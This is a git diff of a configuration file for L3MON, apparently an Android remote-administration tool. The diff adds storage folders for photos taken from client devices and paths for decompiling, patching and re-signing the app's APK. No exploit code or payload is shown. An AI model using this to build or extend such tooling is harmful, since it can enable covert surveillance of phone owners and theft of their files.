@@ -3,7 +3,6 @@ const path = require('path');
 exports.debug = false;
 
 exports.web_port = 22533;
-exports.control_port = 22222;
 
 // Paths
 exports.apkBuildPath = path.join(__dirname, '../database/built_apks/build.apk')
@@ -11,11 +10,20 @@ exports.apkSignedBuildPath = path.join(__dirname, '../database/built_apks/L3MON.
 
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../database', exports.downloadsFolder)
+exports.photosFolder = '/client_photos'
+exports.photosFullPath = path.join(__dirname, '../database', exports.photosFolder)
 
 exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
 exports.uberApkSigner = path.join(__dirname, '../app/factory/', 'uber-apk-signer.jar'); // Use uber-apk-signer for better Java 17 compatibility
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
-exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');
+
+// Raw, compiled APK produced from app_source (input to decompile step)
+exports.rawApkPath = path.join(__dirname, '../app/factory/rawapk/app-debug.apk');
+// Relative class path for dynamic resolution across smali, smali_classes2, smali_classes3, ...
+exports.smaliClassRelative = path.join('com', 'etechd', 'l3mon', 'core', 'config', 'Config.smali');
+
+// Build progress tracking file
+exports.buildProgressFile = path.join(__dirname, '../database/built_apks/build_progress.json');
 
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
 exports.signCommand = 'java -jar "' + exports.uberApkSigner + '" --apks "' + exports.apkBuildPath + '" --overwrite';
